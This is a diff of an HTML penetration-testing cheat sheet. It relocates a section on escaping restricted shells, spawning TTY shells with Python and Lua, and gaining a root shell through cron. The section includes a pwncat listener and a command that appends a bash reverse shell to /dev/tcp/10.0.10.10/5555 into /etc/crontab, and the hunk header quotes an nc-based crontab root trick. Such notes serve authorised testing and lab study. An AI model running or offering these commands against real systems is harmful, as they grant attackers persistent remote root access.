@@ -257,20 +257,7 @@ add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c
 
 <h1>Spawn TTY shell / Stablelize your Shell</h1>
 
-<b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
-<b>From crontab to bash</b>
-
-example 1.
-
-First start listner<code>pwncat -l -p 5555<code>
-
-then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
-
-Then you just have to look and wait in your lister terminal for 1 min.
-
-
-<
 
 <code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
 
@@ -286,9 +273,18 @@ Then you just have to look and wait in your lister terminal for 1 min.
 
 <code>lua: os.execute('/bin/sh')</code>
 
-<h1>Stabalize your shell</h1>
 
+<b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
+<b>From crontab to bash</b>
+
+example 1.
+
+First start listner<code>pwncat -l -p 5555<code>
+
+then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
+
+Then you just have to look and wait in your lister terminal for 1 min.
 
 
 <h1>Password Cracking</h1>
